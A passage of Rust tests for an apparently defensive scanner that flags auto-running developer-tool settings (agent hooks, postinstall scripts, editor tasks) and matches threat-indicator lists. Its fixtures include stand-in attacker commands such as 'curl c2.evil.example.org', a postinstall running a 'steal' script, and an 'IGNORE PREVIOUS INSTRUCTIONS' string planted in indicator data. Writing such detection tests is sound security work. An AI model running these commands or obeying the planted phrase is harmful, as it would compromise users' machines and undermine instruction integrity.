    put(&e.home().join(".codex/config.toml"), "model = \"x\"\n");
    put(&e.home().join(".claude/skills/a/SKILL.md"), "x\n");
    put(&e.home().join(".gemini/settings.json"), "{}");
    e.run();
    let page = e.this_mac_page();
    let start = page.find("<section id=\"home-code-runs\">").unwrap();
    let section = &page[start..start + page[start..].find("</section>").unwrap()];
    let rows: Vec<Vec<&str>> = section
        .split("<tr>")
        .skip(2)
        .map(|row| {
            row.split("<td")
                .skip(1)
                .map(|cell| &cell[cell.find('>').unwrap() + 1..cell.find("</td>").unwrap()])
                .collect()
        })
        .collect();
    let read = rows.len();
    assert!(rows.iter().all(|r| r[3].starts_with("Read")), "{rows:?}");
    let here: Vec<(&str, &str)> = rows
        .iter()
        .filter(|r| r[4] == "Yes")
        .map(|r| (r[0], r[3]))
        .collect();
    assert_eq!(here, [("~/.gemini/settings.json", "Read")]);
    assert!(rows.iter().all(|r| r[4] == "Yes" || r[4] == "No"));
    // Present and not read: Codex's settings and Claude Code's skills, which no row names.
    assert!(!section.contains(".codex") && !section.contains(".claude/skills"));
    let present = 2;
    let item = |r: &serde_json::Value| {
        r["not_covered"]
            .as_array()
            .unwrap()
            .iter()
            .find(|u| u["id"] == "home-autorun")
            .unwrap()
            .clone()
    };
    let u = item(&e.status());
    let title = u["title"].as_str().unwrap();
    assert!(
        title.starts_with(&format!("This version reads {read} of the "))
            && title.ends_with(
                " known places where a developer tool's own settings can make code run by itself."
            ),
        "{title}"
    );
    assert_eq!(
        u["meaning"],
        format!(
            "{present} of the others are present on this Mac and are not read, so a change in them would go unseen."
        )
    );
    // Ways found here raised it: it holds on this Mac, never on every Mac.
    assert!(present > 0);
    assert_eq!(
        (&u["who"], &u["count"], &u["holds_on"]),
        (&"nothing".into(), &present.into(), &"this_mac".into())
    );
    assert!(
        e.status()["not_covered"]
            .as_array()
            .unwrap()
            .iter()
            .all(|u| u["id"] != "not-understood")
    );
    std::fs::remove_dir_all(e.home().join(".codex")).unwrap();
    std::fs::remove_dir_all(e.home().join(".claude")).unwrap();
    e.run();
    assert_eq!(
        item(&e.status())["meaning"],
        "None of the others is present on this Mac now."
    );
}

// Worktrees of a project the store holds.

/// A linked worktree of the checkout `main` at `rel`, as `git worktree add` leaves it: its
/// `.git` file points into the repository's folder of worktrees, whose `gitdir` points back
/// and whose `commondir` names the repository's folder.
fn worktree(e: &Estate, main: &Path, rel: &str) -> PathBuf {
    let path = e.home().join(rel);
    let own = main.join(".git/worktrees").join(path.file_name().unwrap());
    put(&path.join(".git"), &format!("gitdir: {}\n", own.display()));
    put(
        &own.join("gitdir"),
        &format!("{}\n", path.join(".git").display()),
    );
    put(&own.join("commondir"), "../..\n");
    put(&own.join("HEAD"), "ref: refs/heads/feature\n");
    path
}

/// The journal's entries for places that raised nothing for being the same as in another
/// checkout, as subject and the checkout they are the same as.
fn same_as(e: &Estate) -> Vec<String> {
    e.rows(
        "SELECT subject, json_extract(text, '$.checkout') FROM journal
         WHERE entry = 'same_as_sibling' ORDER BY subject",
    )
}

#[test]
fn a_worktree_of_a_known_project_with_the_same_agent_settings_raises_nothing_and_the_journal_says_where_it_is_the_same()
 {
    // Agents make a worktree of a project all day; its settings are the project's own, byte
    // for byte, and run nothing the project does not. An alarm for each would teach the owner
    // to ignore the alarm. A finding that stands in the project stands alone.
    let e = Estate::new("worktree-same");
    let shop = e.checkout("dev/shop");
    agent(&shop, "");
    e.run();
    agent(&shop, HOOK);
    e.run();
    assert_eq!(
        e.found(),
        [pair(
            "autorun.agent-start",
            "~/dev/shop/.claude/settings.json#/hooks"
        )]
    );
    let tree = worktree(&e, &shop, "dev/shop-feature");
    agent(&tree, HOOK);
    e.run();
    assert_eq!(
        e.found(),
        [pair(
            "autorun.agent-start",
            "~/dev/shop/.claude/settings.json#/hooks"
        )]
    );
    assert_eq!(
        same_as(&e),
        [
            "file:machine:mac/dev/shop-feature/.claude/settings.json#/hooks|checkout:machine:mac/dev/shop"
        ]
    );
    // Recorded as any place is, with the part that counts the journal says is the same.
    let content = |like: &str| {
        e.rows(&format!(
            "SELECT object FROM assertion WHERE layer = 'live' AND predicate = 'has_content'
               AND subject LIKE '%{like}'"
        ))
    };
    let project = content("dev/shop/.claude/settings.json#/hooks");
    assert_eq!(project.len(), 1);
    assert_eq!(
        content("shop-feature/.claude/settings.json#/hooks"),
        project
    );
    assert_eq!(
        e.rows("SELECT new_value FROM journal WHERE entry = 'same_as_sibling'"),
        project
    );
}

#[test]
fn a_later_change_in_a_worktrees_place_that_raised_nothing_is_a_finding_like_any_change() {
    // Only the worktree's first appearance is judged against its project. After it, a place
    // that changes or appears in it is a finding as in any checkout, even the same as the
    // project's.
    let e = Estate::new("worktree-later");
    let shop = e.checkout("dev/shop");
    agent(&shop, HOOK);
    package(&shop, "\"postinstall\": \"node .invented/setup-3c1d.js\"");
    e.run();
    let tree = worktree(&e, &shop, "dev/shop-feature");
    agent(&tree, HOOK);
    e.run();
    assert!(e.rules().is_empty(), "{:?}", e.findings(false));
    agent(&tree, &HOOK.replace("start-91c2", "start-0b7e"));
    package(&tree, "\"postinstall\": \"node .invented/setup-3c1d.js\"");
    e.run();
    assert_eq!(
        e.found(),
        [
            pair(
                "autorun.agent-start",
                "~/dev/shop-feature/.claude/settings.json#/hooks"
            ),
            pair(
                "autorun.package-install",
                "~/dev/shop-feature/package.json#/scripts/postinstall"
            ),
        ]
    );
}

#[test]
fn a_worktree_whose_part_that_counts_differs_from_its_projects_raises_the_finding() {
    // Equal is per place and per part: what the project does not run is new, wherever its
    // neighbours in the same file are the same. The same part in a project of another
    // repository counts for nothing.
    let e = Estate::new("worktree-differs");
    let shop = e.checkout("dev/shop");
    agent(&shop, HOOK);
    package(&shop, "\"postinstall\": \"node .invented/setup-3c1d.js\"");
    let web = e.checkout("dev/web");
    agent(&web, &HOOK.replace("start-91c2", "start-0b7e"));
    put(&web.join(".mcp.json"), SERVER);
    e.run();
    let tree = worktree(&e, &shop, "dev/shop-feature");
    agent(&tree, &HOOK.replace("start-91c2", "start-0b7e"));
    package(&tree, "\"postinstall\": \"node .invented/setup-3c1d.js\"");
    put(&tree.join(".mcp.json"), SERVER);
    e.run();
    assert_eq!(
        e.found(),
        [
            pair(
                "autorun.agent-start",
                "~/dev/shop-feature/.claude/settings.json#/hooks"
            ),
            pair(
                "autorun.agent-start",
                "~/dev/shop-feature/.mcp.json#/mcpServers/helper"
            ),
        ]
    );
    assert_eq!(
        same_as(&e),
        [
            "file:machine:mac/dev/shop-feature/package.json#/scripts/postinstall|checkout:machine:mac/dev/shop"
        ]
    );
}

#[test]
fn a_separate_clone_with_byte_identical_settings_still_raises_the_finding() {
    // A fresh clone with something that runs by itself is the attack this program is for. The
    // same bytes in another repository, of the same name or from the same remote, prove
    // nothing.
    let e = Estate::new("clone-same");
    let shop = e.checkout("dev/shop");
    agent(&shop, HOOK);
    put(
        &shop.join(".git/config"),
        "[remote \"origin\"]\n\turl = https://git.example.invalid/shop.git\n",
    );
    e.run();
    let clone = e.checkout("work/shop");
    agent(&clone, HOOK);
    put(
        &clone.join(".git/config"),
        "[remote \"origin\"]\n\turl = https://git.example.invalid/shop.git\n",
    );
    e.run();
    assert_eq!(
        e.found(),
        [pair(
            "autorun.agent-start",
            "~/work/shop/.claude/settings.json#/hooks"
        )]
    );
    assert!(same_as(&e).is_empty());
}

#[test]
fn a_folder_that_claims_to_be_a_worktree_without_the_projects_pointer_back_still_raises_the_finding()
 {
    // The `.git` file of a folder is text anyone who writes in it can write. It is believed
    // only when the project's own git folder points back at it.
    let e = Estate::new("worktree-forged");
    let shop = e.checkout("dev/shop");
    agent(&shop, HOOK);
    e.run();
    // A worktree that is real, so that its folder in the project's git folder exists.
    let real = worktree(&e, &shop, "dev/shop-feature");
    agent(&real, HOOK);
    e.run();
    assert!(e.rules().is_empty(), "{:?}", e.findings(false));
    // Points at a folder of worktrees that does not exist.
    let none = e.home().join("dev/none");
    put(
        &none.join(".git"),
        &format!("gitdir: {}\n", shop.join(".git/worktrees/none").display()),
    );
    agent(&none, HOOK);
    // Points at the real worktree's folder, which points back at the real worktree: a copy.
    let copy = e.home().join("dev/copy");
    put(
        &copy.join(".git"),
        &format!(
            "gitdir: {}\n",
            shop.join(".git/worktrees/shop-feature").display()
        ),
    );
    agent(&copy, HOOK);
    // Keeps every pointer, back included, in a folder of its own outside the project's git
    // folder.
    let forged = e.home().join("dev/forged");
    let own = forged.join(".pointers/forged");
    put(
        &forged.join(".git"),
        &format!("gitdir: {}\n", own.display()),
    );
    put(
        &own.join("gitdir"),
        &format!("{}\n", forged.join(".git").display()),
    );
    put(
        &own.join("commondir"),
        &format!("{}\n", shop.join(".git").display()),
    );
    agent(&forged, HOOK);
    // Its `.git` is a link to the project's git folder: no worktree git made.
    let linked = e.home().join("dev/linked");
    std::fs::create_dir_all(&linked).unwrap();
    std::os::unix::fs::symlink(shop.join(".git"), linked.join(".git")).unwrap();
    agent(&linked, HOOK);
    e.run();
    assert_eq!(
        e.found(),
        [
            pair(
                "autorun.agent-start",
                "~/dev/copy/.claude/settings.json#/hooks"
            ),
            pair(
                "autorun.agent-start",
                "~/dev/forged/.claude/settings.json#/hooks"
            ),
            pair(
                "autorun.agent-start",
                "~/dev/linked/.claude/settings.json#/hooks"
            ),
            pair(
                "autorun.agent-start",
                "~/dev/none/.claude/settings.json#/hooks"
            ),
        ]
    );
}

#[test]
fn a_worktree_an_agent_keeps_inside_its_project_is_judged_by_the_path_of_a_place_in_the_worktree() {
    // Agents keep their worktrees inside the project's own folder, where only their sessions
    // lead. A place there belongs to the worktree, the deepest checkout that holds it, and is
    // compared with the project's place of the same path from its own checkout.
    let e = Estate::new("worktree-inside");
    let shop = e.checkout("dev/shop");
    agent(&shop, HOOK);
    e.run();
    let tree = worktree(&e, &shop, "dev/shop/.claude/worktrees/fix");
    agent(&tree, HOOK);
    let sessions = e.0.join("sessions/fix");
    put(
        &sessions.join("session.jsonl"),
        &format!("{}\n", serde_json::json!({ "cwd": tree })),
    );
    e.run_with(&e.home(), &e.0.join("sessions"));
    assert!(e.rules().is_empty(), "{:?}", e.findings(false));
    assert_eq!(
        same_as(&e),
        [
            "file:machine:mac/dev/shop/.claude/worktrees/fix/.claude/settings.json#/hooks|checkout:machine:mac/dev/shop"
        ]
    );
}

#[test]
fn an_install_script_and_an_editor_task_in_a_worktree_are_judged_as_agent_settings_are() {
    // The comparison is of every place read in a checkout, not of one tool's file.
    let e = Estate::new("worktree-general");
    let shop = e.checkout("dev/shop");
    package(&shop, "\"postinstall\": \"node .invented/setup-3c1d.js\"");
    put(&shop.join(".vscode/tasks.json"), ON_OPEN);
    e.run();
    let same = worktree(&e, &shop, "dev/shop-same");
    package(&same, "\"postinstall\": \"node .invented/setup-3c1d.js\"");
    put(&same.join(".vscode/tasks.json"), ON_OPEN);
    let other = worktree(&e, &shop, "dev/shop-other");
    package(&other, "\"postinstall\": \"node .invented/steal-77aa.js\"");
    put(
        &other.join(".vscode/tasks.json"),
        &ON_OPEN.replace("setup", "steal"),
    );
    e.run();
    assert_eq!(
        e.found(),
        [
            pair("autorun.folder-open", "~/dev/shop-other/.vscode/tasks.json"),
            pair(
                "autorun.package-install",
                "~/dev/shop-other/package.json#/scripts/postinstall"
            ),
        ]
    );
    assert_eq!(
        same_as(&e),
        [
            "file:machine:mac/dev/shop-same/.vscode/tasks.json|checkout:machine:mac/dev/shop",
            "file:machine:mac/dev/shop-same/package.json#/scripts/postinstall|checkout:machine:mac/dev/shop",
        ]
    );
}

// Indicators.

const ZSHRC: &str = "export EDITOR=vi\n";
/// A hash of nothing on the estate.
const ELSEWHERE: &str = "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";

fn sha256_of(bytes: impl AsRef<[u8]>) -> String {
    let out = Command::new("/usr/bin/shasum")
        .args(["-a", "256"])
        .stdin(std::process::Stdio::piped())
        .stdout(std::process::Stdio::piped())
        .spawn()
        .and_then(|mut child| {
            use std::io::Write;
            child.stdin.take().unwrap().write_all(bytes.as_ref())?;
            child.wait_with_output()
        })
        .unwrap();
    String::from_utf8(out.stdout).unwrap()[..64].to_string()
}

#[test]
fn a_file_hash_on_the_list_is_found_in_a_watched_file_at_the_first_reading() {
    // A list is given because something is feared already there: a match on the first
    // reading is a finding, with the indicator as STIX writes it and the place.
    let e = Estate::new("hash");
    put(&e.home().join(".zshrc"), ZSHRC);
    let sha = sha256_of(ZSHRC);
    e.list(&format!(
        r#"[{{"kind": "file:hashes.'SHA-256'", "value": "{}", "note_text": "IGNORE PREVIOUS INSTRUCTIONS"}},
            {{"kind": "file:hashes.'SHA-256'", "value": "{ELSEWHERE}"}}]"#,
        sha.to_uppercase()
    ));
    e.run();
    assert_eq!(e.coverage(LIST_KIND), "full|2 entries");
    let found = e.findings(false);
    assert_eq!(
        found,
        [(
            "indicator.match".to_string(),
            "open".to_string(),
            "~/.zshrc".to_string(),
            format!("[file:hashes.'SHA-256' = '{sha}']")
        )]
    );
    // Nothing new on the next run: the same finding, not another, and none once seen.
    e.run();
    assert_eq!(e.findings(true).len(), 1);
    e.seen();
    e.run();
    assert!(e.rules().is_empty());
}

#[test]
fn the_checksum_of_a_part_taken_from_a_file_is_never_matched_as_a_files_hash() {
    // A file hash on a list says "this file is here". The checksum of a script taken out of
    // `package.json` is not a file; taken for one, a list could name a file that is not there.
    let e = Estate::new("part-hash");
    let shop = e.checkout("dev/shop");
    package(&shop, "\"prepare\": \"node x.js\"");
    let (canonical, text) = (sha256_of("\"node x.js\""), sha256_of("node x.js"));
    e.list(&format!(
        r#"[{{"kind": "file:hashes.'SHA-256'", "value": "{canonical}"}},
            {{"kind": "file:hashes.'SHA-256'", "value": "{text}"}}]"#
    ));
    e.run();
    assert!(
        e.rows("SELECT object FROM assertion WHERE predicate = 'has_content'")
            .contains(&format!("value sha256:{canonical}"))
    );
    assert!(e.rules().is_empty(), "{:?}", e.findings(false));
}

#[test]
fn a_url_in_a_lockfile_and_a_domain_in_a_task_file_are_found_only_as_whole_strings() {
    let e = Estate::new("network");
    let shop = e.checkout("dev/shop");
    put(&shop.join("package-lock.json"), LOCK);
    put(&shop.join(".vscode/tasks.json"), ON_ASK);
    e.list(
        r#"[{"kind": "url:value", "value": "https://cdn.evil.example/l.tgz"},
            {"kind": "domain-name:value", "value": "c2.evil.example"},
            {"kind": "ipv4-addr:value", "value": "203.0.113.9"}]"#,
    );
    e.run();
    assert!(e.rules().is_empty());
    // Near misses: a longer URL, a longer name, another address.
    let near = LOCK.replace(
        "https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz",
        "https://cdn.evil.example/l.tgz.sig",
    );
    put(&shop.join("package-lock.json"), &near);
    put(
        &shop.join(".vscode/tasks.json"),
        &ON_ASK.replace("make", "curl c2.evil.example.org 203.0.113.90"),
    );
    e.run();
    assert!(e.rules().is_empty(), "{:?}", e.findings(false));
    put(
        &shop.join("package-lock.json"),
        &near.replace(".tgz.sig", ".tgz"),
    );
    put(
        &shop.join(".vscode/tasks.json"),
        &ON_ASK.replace("make", "curl https://C2.Evil.Example/x"),
    );
    e.run();
    let mut found: Vec<(String, String)> =
        e.findings(false).into_iter().map(|f| (f.2, f.3)).collect();
    found.sort();
    assert_eq!(
        found,
        [
            (
                "~/dev/shop/.vscode/tasks.json".to_string(),
                "[domain-name:value = 'c2.evil.example']".to_string()
            ),
            (
                "~/dev/shop/package-lock.json".to_string(),
                "[url:value = 'https://cdn.evil.example/l.tgz']".to_string()
            ),
        ]
    );
}

#[test]
fn a_list_out_of_shape_fails_and_the_list_read_before_is_still_matched() {
    let e = Estate::new("malformed");
    let shop = e.checkout("dev/shop");
    put(&shop.join("package-lock.json"), LOCK);
    e.list(r#"[{"kind": "domain-name:value", "value": "evil.example"}]"#);
    e.run();
    e.list(r#"[{"kind": "domain-name:value", "value": "not a name"}]"#);
    e.run();
    assert_eq!(
        e.coverage(LIST_KIND),
        "none|entry 1: not a domain name in ASCII; the list read before is matched"
    );
    put(
        &shop.join("package-lock.json"),
        &LOCK.replace("registry.npmjs.org", "evil.example"),
    );
    e.run();
    assert_eq!(e.rules(), ["indicator.match"]);
}

#[test]
fn a_first_list_out_of_shape_fails_and_matches_nothing() {
    let e = Estate::new("first-malformed");
    e.checkout("dev/shop");
    e.list("not json");
    e.run();
    let coverage = e.coverage(LIST_KIND);
    assert!(
        coverage.starts_with("none|not JSON") && coverage.ends_with("; no list was read before"),
        "{coverage}"
    );
    assert!(e
        .rows("SELECT 1 FROM coverage WHERE reader = 'indicators' AND kind != 'indicator list given as a file'")
        .is_empty());
}

#[test]
fn an_indicator_taken_off_the_list_leaves_its_finding_open_for_the_owner() {
    let e = Estate::new("taken-off");
    let shop = e.checkout("dev/shop");
    put(
        &shop.join("package-lock.json"),
        &LOCK.replace("registry.npmjs.org", "evil.example"),
    );
    e.list(r#"[{"kind": "domain-name:value", "value": "evil.example"}]"#);
    e.run();
    assert_eq!(e.rules(), ["indicator.match"]);
    e.list("[]");
    e.run();
    assert_eq!(e.rules(), ["indicator.match"]);
    assert!(
        e.rows("SELECT 1 FROM assertion WHERE layer = 'live' AND predicate = 'matches_indicator'")
            .is_empty()
    );
}

const MATCH_KIND: &str = "indicators matched against watched files and texts read in checkouts";

/// The live indicator matches, as file and indicator, sorted.
fn indicator_matches(e: &Estate) -> Vec<String> {
    e.rows(
        "SELECT subject, object FROM assertion WHERE layer = 'live'
           AND predicate = 'matches_indicator' ORDER BY subject, object",
    )
}

/// Two invented indicators.
const LIST_AB: &str = r#"[{"kind": "domain-name:value", "value": "a.sample.invalid"},
    {"kind": "domain-name:value", "value": "b.sample.invalid"}]"#;

/// A project six folders down, past the depth of the whole walk.
const DEEP: &str = "src/clients/acme/apps/web/frontend";

/// A lockfile that names `host`.
fn naming(host: &str) -> String {
    LOCK.replace("registry.npmjs.org", host)
}

/// A live match as `indicator_matches` gives it.
fn matched(file: &str, host: &str) -> String {
    format!("file:machine:mac/{file}|[domain-name:value = '{host}']")
}

/// The latest cause of the reading of matches.
fn match_cause(e: &Estate) -> String {
    e.rows(&format!(
        "SELECT cause FROM coverage WHERE kind = '{MATCH_KIND}' ORDER BY id DESC LIMIT 1"
    ))
    .concat()
}

/// The project `DEEP`, found by a run pointed nearer, whose lockfile names `a.sample.invalid`.
fn deep_match(e: &Estate) -> PathBuf {
    let deep = e.checkout(DEEP);
    put(&deep.join("package-lock.json"), &naming("a.sample.invalid"));
    e.list(LIST_AB);
    e.run_in(&e.home().join("src"));
    deep
}

#[test]
fn a_new_text_match_raises_a_finding_and_a_match_made_again_as_it_was_raises_nothing_new() {
    let e = Estate::new("match-raised");
    deep_match(&e);
    let value = "[domain-name:value = 'a.sample.invalid']".to_string();
    assert_eq!(
        e.findings(false),
        [(
            "indicator.match".to_string(),
            "open".to_string(),
            format!("~/{DEEP}/package-lock.json"),
            value
        )]
    );
    e.seen();
    e.full();
    assert_eq!(
        indicator_matches(&e),
        [matched(
            &format!("{DEEP}/package-lock.json"),
            "a.sample.invalid"
        )]
    );
    assert!(e.rules().is_empty(), "{:?}", e.findings(false));
}

#[test]
fn a_match_in_a_file_not_read_this_run_is_made_again_as_it_was_until_the_file_is_read_without_it() {
    let e = Estate::new("match-carried");
    let deep = deep_match(&e);
    // The text no longer names the indicator: only making the match again keeps it.
    put(&deep.join("package-lock.json"), LOCK);
    e.full();
    assert_eq!(
        indicator_matches(&e),
        [matched(
            &format!("{DEEP}/package-lock.json"),
            "a.sample.invalid"
        )]
    );
    assert_eq!(
        e.coverage(MATCH_KIND),
        "partial|1 known checkout was not looked into"
    );
    assert_eq!(match_cause(&e), "not_given");
    e.run_in(&e.home().join("src"));
    assert!(indicator_matches(&e).is_empty());
    assert_eq!(e.coverage(MATCH_KIND), "full|");
}

#[test]
fn a_hash_match_whose_file_changed_is_retracted_though_its_checkout_was_not_looked_into_and_its_bytes_back_raise_a_new_finding()
 {
    // The folder of a person's SSH files kept as a checkout: hidden, so the whole walk does
    // not look into it, while the file is read as a watched place at every check.
    let e = Estate::new("match-hash-held");
    let ssh = e.checkout(".ssh");
    let rc = ssh.join("rc");
    let bytes = "echo sample\n";
    put(&rc, bytes);
    e.list(&format!(
        r#"[{{"kind": "file:hashes.'SHA-256'", "value": "{}"}}]"#,
        sha256_of(bytes)
    ));
    e.run_in(&ssh);
    assert_eq!(e.rules(), ["indicator.match"]);
    e.seen();
    put(&rc, "echo other\n");
    e.full();
    assert!(indicator_matches(&e).is_empty());
    assert_eq!(
        e.coverage(MATCH_KIND),
        "partial|1 known checkout was not looked into"
    );
    // The change is a finding of its own, beside the one the bytes coming back raise.
    e.seen();
    put(&rc, bytes);
    e.full();
    assert!(e.rules().contains(&"indicator.match".to_string()));
}

#[test]
fn a_file_read_through_an_outer_checkout_decides_its_own_matches_though_its_checkout_was_not_looked_into()
 {
    // The whole walk finds the outer checkout and does not go into it: the inner one, found
    // by a run pointed at it, is held and not looked into, while the outer one's lockfiles
    // include its own.
    let e = Estate::new("match-outer");
    e.checkout("dev/mono");
    let lock = e.checkout("dev/mono/pkg").join("package-lock.json");
    put(&lock, &naming("a.sample.invalid"));
    e.list(LIST_AB);
    e.run_in(&e.home().join("dev/mono/pkg"));
    put(&lock, &naming("b.sample.invalid"));
    e.full();
    assert_eq!(
        indicator_matches(&e),
        [matched(
            "dev/mono/pkg/package-lock.json",
            "b.sample.invalid"
        )]
    );
}

#[test]
fn the_reading_names_a_file_that_could_not_be_read_and_how_many_known_checkouts_were_not_looked_into()
 {
    let e = Estate::new("match-reasons");
    for name in ["one", "two"] {
        e.checkout(&format!("src/clients/acme/apps/web/{name}"));
    }
    e.run_in(&e.home().join("src"));
    let tasks = e.checkout("dev/shop").join(".vscode/tasks.json");
    put(&tasks, &ON_ASK.replace("make", "curl a.sample.invalid"));
    e.list(LIST_AB);
    e.full();
    mode(&tasks, 0o000);
    e.full();
    mode(&tasks, 0o644);
    // What the file matched is made again as it was.
    assert_eq!(
        indicator_matches(&e),
        [matched("dev/shop/.vscode/tasks.json", "a.sample.invalid")]
    );
    let coverage = e.coverage(MATCH_KIND);
    assert!(
        coverage.starts_with("partial|could not be read: dev/shop/.vscode/tasks.json (")
            && coverage.ends_with("); 2 known checkouts were not looked into"),
        "{coverage}"
    );
    assert_eq!(match_cause(&e), "failed");
}

#[test]
fn the_reading_of_matches_is_partial_when_the_checkout_walk_failed() {
    let e = Estate::new("match-walk-failed");
    e.checkout("dev/shop");
    let locked = e.home().join("dev/locked");
    std::fs::create_dir_all(&locked).unwrap();
    e.list(LIST_AB);
    mode(&locked, 0o000);
    e.full();
    mode(&locked, 0o755);
    assert_eq!(
        e.coverage(MATCH_KIND),
        "partial|the checkout walk could not list some folders"
    );
    assert_eq!(match_cause(&e), "failed");
}

/// A project `dev/shop` whose `file`, relative to it, names `a.sample.invalid`, read once:
/// the match is there and the reading of matches is full.
fn shop_match(e: &Estate, file: &str, text: &str) -> PathBuf {
    let shop = e.checkout("dev/shop");
    put(&shop.join(file), text);
    e.list(LIST_AB);
    e.run();
    assert_eq!(
        indicator_matches(e),
        [matched(&format!("dev/shop/{file}"), "a.sample.invalid")]
    );
    assert_eq!(e.coverage(MATCH_KIND), "full|");
    shop
}

#[test]
fn a_match_in_a_folder_of_a_project_that_could_not_be_listed_is_kept_and_the_reading_names_the_project()
 {
    let e = Estate::new("match-unlisted");
    let shop = shop_match(&e, "web/package-lock.json", &naming("a.sample.invalid"));
    mode(&shop.join("web"), 0o000);
    e.run();
    mode(&shop.join("web"), 0o755);
    assert_eq!(indicator_matches(&e).len(), 1);
    assert_eq!(
        e.coverage(MATCH_KIND),
        "partial|a folder could not be listed in dev/shop"
    );
    assert_eq!(match_cause(&e), "failed");
}

#[test]
fn a_match_in_a_lockfile_that_became_a_link_is_kept_and_the_reading_names_it_as_not_opened() {
    let e = Estate::new("match-linked");
    let shop = shop_match(&e, "package-lock.json", &naming("a.sample.invalid"));
    put(&shop.join("elsewhere.json"), LOCK);
    std::fs::remove_file(shop.join("package-lock.json")).unwrap();
    std::os::unix::fs::symlink("elsewhere.json", shop.join("package-lock.json")).unwrap();
    e.run();
    assert_eq!(indicator_matches(&e).len(), 1);
    assert_eq!(
        e.coverage(MATCH_KIND),
        "partial|1 lockfile found and not opened in dev/shop"
    );
    assert_eq!(match_cause(&e), "no_reader");
}

#[test]
fn a_match_in_a_task_file_that_could_not_be_looked_at_is_kept_and_the_reading_names_it() {
    // The folder of the task file is a link to itself: the file cannot be looked at, and the
    // walk for lockfiles does not follow the link.
    let e = Estate::new("match-task-loop");
    let shop = shop_match(
        &e,
        ".vscode/tasks.json",
        &ON_ASK.replace("make", "curl a.sample.invalid"),
    );
    std::fs::remove_dir_all(shop.join(".vscode")).unwrap();
    std::os::unix::fs::symlink(".vscode", shop.join(".vscode")).unwrap();
    e.run();
    assert_eq!(indicator_matches(&e).len(), 1);
    let coverage = e.coverage(MATCH_KIND);
    assert!(
        coverage.starts_with("partial|could not be read: dev/shop/.vscode/tasks.json ("),
        "{coverage}"
    );
    assert_eq!(match_cause(&e), "failed");
}

#[test]
fn a_match_under_a_project_not_looked_into_is_kept_though_a_project_inside_it_was_looked_into() {
    // The project inside is the only root given: its walk does not read the outer project's
    // task file, which lies in its folder.
    let e = Estate::new("match-any-prefix");
    let app = shop_match(
        &e,
        ".vscode/tasks.json",
        &ON_ASK.replace("make", "curl a.sample.invalid"),
    );
    put(&app.join(".vscode/.git/HEAD"), "ref: refs/heads/main\n");
    e.run_in(&app.join(".vscode"));
    assert_eq!(
        indicator_matches(&e),
        [matched("dev/shop/.vscode/tasks.json", "a.sample.invalid")]
    );
    assert_eq!(
        e.coverage(MATCH_KIND),
        "partial|1 known checkout was not looked into"
    );
}

#[test]
fn a_lockfile_replaced_by_a_folder_loses_its_match_the_reading_is_full_and_its_text_back_raises_a_new_finding()
 {
    let e = Estate::new("match-folder");
    let shop = shop_match(&e, "package-lock.json", &naming("a.sample.invalid"));
    e.seen();
    let lock = shop.join("package-lock.json");
    std::fs::remove_file(&lock).unwrap();
    std::fs::create_dir_all(&lock).unwrap();
    e.run();
    assert!(indicator_matches(&e).is_empty());
    assert_eq!(e.coverage(MATCH_KIND), "full|");
    std::fs::remove_dir_all(&lock).unwrap();
    put(&lock, &naming("a.sample.invalid"));
    e.run();
    assert_eq!(e.rules(), ["indicator.match"]);
}

#[test]
fn in_one_run_a_match_in_a_file_not_read_is_kept_while_a_match_in_a_deleted_lockfile_of_a_project_looked_into_goes()
 {
    let e = Estate::new("match-per-file");
    let tasks = e.checkout("dev/shop").join(".vscode/tasks.json");
    put(&tasks, &ON_ASK.replace("make", "curl a.sample.invalid"));
    let lock = e.checkout("dev/web").join("package-lock.json");
    put(&lock, &naming("b.sample.invalid"));
    e.list(LIST_AB);
    e.run();
    assert_eq!(indicator_matches(&e).len(), 2);
    mode(&tasks, 0o000);
    std::fs::remove_file(&lock).unwrap();
    e.run();
    mode(&tasks, 0o644);
    assert_eq!(
        indicator_matches(&e),
        [matched("dev/shop/.vscode/tasks.json", "a.sample.invalid")]
    );
    let coverage = e.coverage(MATCH_KIND);
    assert!(
        coverage.starts_with("partial|could not be read: dev/shop/.vscode/tasks.json (")
            && !coverage.contains("dev/web"),
        "{coverage}"
    );
}

#[test]
fn an_indicator_taken_off_the_list_goes_although_its_file_could_not_be_read() {
    let e = Estate::new("match-off-list-unreadable");
    let shop = shop_match(
        &e,
        ".vscode/tasks.json",
        &ON_ASK.replace("make", "curl a.sample.invalid"),
    );
    let tasks = shop.join(".vscode/tasks.json");
    e.list(r#"[{"kind": "domain-name:value", "value": "b.sample.invalid"}]"#);
    mode(&tasks, 0o000);
    e.run();
    mode(&tasks, 0o644);
    assert!(indicator_matches(&e).is_empty());
    assert!(
        e.coverage(MATCH_KIND)
            .starts_with("partial|could not be read: ")
    );
}

#[test]
fn what_an_indicator_is_not_matched_against_is_named_never_answered_as_no_match() {
    // A block of addresses and a file name have no matcher: both are said by name, so silence
    // is never read as "not here". One address is matched against what samples see.
    let e = Estate::new("unmatched");
    e.list(
        r#"[{"kind": "ipv4-addr:value", "value": "203.0.113.9"},
            {"kind": "ipv4-addr:value", "value": "203.0.113.0/24"},
            {"kind": "file:name", "value": "loader.js"}]"#,
    );
    e.run();
    assert_eq!(
        e.coverage(UNMATCHED_KIND),
        "none|not matched: file:name; ipv4-addr:value given as a CIDR block"
    );
    assert_eq!(
        e.lacks(UNMATCHED_KIND),
        [
            "indicator kind with no matcher|file:name",
            "indicator kind with no matcher|ipv4-addr:value given as a CIDR block",
        ]
    );
}

#[test]
fn without_a_list_nothing_of_indicators_is_read_or_written() {
    let e = Estate::new("no-list");
    e.checkout("dev/shop");
    e.run();
    assert!(
        e.rows("SELECT 1 FROM coverage WHERE reader = 'indicators'")
            .is_empty()
    );
}

// A change, the baseline, or read for the first time (`baseline.rs`). Each of the next tests
// began as a probe of a review; its name says the promise.

#[test]
fn a_clone_made_after_the_first_check_whose_file_fails_at_first_is_found_and_found_again_when_it_reads()
 {
    // A clone's task file is a link to a file the clone does not hold; the next pull makes it
    // a task file. The clone was made after the first check, so what it holds is new: found
    // while it cannot be read, and again when it reads.
    let e = Estate::new("clone-fails-first");
    let old = e.checkout("dev/old");
    package(&old, "\"postinstall\": \"node setup.js\"");
    e.run();
    let evil = e.checkout("dev/evil");
    link("../.cache/tasks.json", &evil.join(".vscode/tasks.json"));
    e.run();
    assert!(
        e.coverage(TASKS_KIND)
            .contains("could not be read: dev/evil/.vscode/tasks.json ("),
        "{}",
        e.coverage(TASKS_KIND)
    );
    assert_eq!(
        e.found(),
